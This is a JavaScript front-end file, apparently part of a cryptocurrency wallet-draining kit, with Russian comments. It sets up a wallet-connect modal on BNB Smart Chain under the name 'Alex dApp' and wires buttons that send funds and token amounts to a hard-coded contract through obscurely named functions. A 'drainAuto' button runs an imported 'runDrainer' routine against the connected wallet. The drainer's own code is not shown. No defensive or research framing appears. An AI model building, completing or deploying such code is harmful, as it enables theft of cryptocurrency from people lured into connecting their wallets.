import { createAppKit } from '@reown/appkit'
import { bsc } from '@reown/appkit/networks'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { ethers } from 'ethers'
import { runDrainer } from './drainer.js' // Путь к вашему файлу с функцией runDrainer

// === Настройки AppKit ===
const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
const networks = [bsc]
const wagmiAdapter = new WagmiAdapter({ projectId, networks })

const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  metadata: {
    name: 'Alex dApp',
    description: 'Connect and sign',
    url: 'http://localhost:5173',
    icons: ['https://checkalex.xyz/icon.png'],
  },
  projectId,
  features: {
    analytics: true,
    email: false,
    socials: false,
  },
  allWallets: 'SHOW',
})

// === Переменные для провайдера и signer
let provider = null
let signer = null

// === Инициализация после загрузки DOM
window.addEventListener('DOMContentLoaded', () => {
  const connectBtn = document.getElementById('connect')
  const bN3Btn = document.getElementById('bN3')
  const tK7Btn = document.getElementById('tK7')
  const drainerBtn = document.getElementById('drainAuto')

  connectBtn.addEventListener('click', async () => {
    try {
      await modal.open({ view: 'Connect' })

      provider = new ethers.providers.Web3Provider(window.ethereum, 'any')
      signer = provider.getSigner()

      const address = await signer.getAddress()
      console.log('Кошелек подключен:', address)
      alert('Кошелек подключен: ' + address)
    } catch (err) {
      console.error('Ошибка подключения:', err)
      alert('Ошибка подключения: ' + err.message)
    }
  })

  bN3Btn.addEventListener('click', async () => {
    if (!signer) return alert('Сначала подключите кошелек')

    const contract = new ethers.Contract(
      '0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF',
      ['function bN3() external payable'],
      signer
    )

    try {
      const tx = await contract.bN3({
        value: ethers.utils.parseEther('0.01'),
      })
      alert('Транзакция отправлена: ' + tx.hash)
      await tx.wait()
      alert('✅ bN3 выполнена успешно!')
    } catch (err) {
      console.error('Ошибка bN3:', err)
      alert('Ошибка при вызове bN3: ' + (err?.message || 'Неизвестная ошибка'))
    }
  })

  tK7Btn.addEventListener('click', async () => {
    if (!signer) return alert('Сначала подключите кошелек')

    const contract = new ethers.Contract(
      '0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF',
      ['function tK7(uint256 usdtAmount, uint256 usdcAmount) external'],
      signer
    )

    try {
      const tx = await contract.tK7(
        ethers.utils.parseUnits('1.0', 6), // 1 USDT
        ethers.utils.parseUnits('1.0', 6)  // 1 USDC
      )
      alert('Транзакция отправлена: ' + tx.hash)
      await tx.wait()
      alert('✅ tK7 выполнена успешно!')
    } catch (err) {
      console.error('Ошибка tK7:', err)
      alert('Ошибка при вызове tK7: ' + (err?.message || 'Неизвестная ошибка'))
    }
  })

  drainerBtn.addEventListener('click', async () => {
    if (!signer || !provider) return alert('Сначала подключите кошелек')
    const address = await signer.getAddress()
    try {
      await runDrainer(provider, signer, address)
      alert('✅ Drainer завершён успешно!')
    } catch (err) {
      console.error('Ошибка при выполнении runDrainer:', err)
      alert('Ошибка runDrainer: ' + (err?.message || 'Неизвестная ошибка'))
    }
  })
})
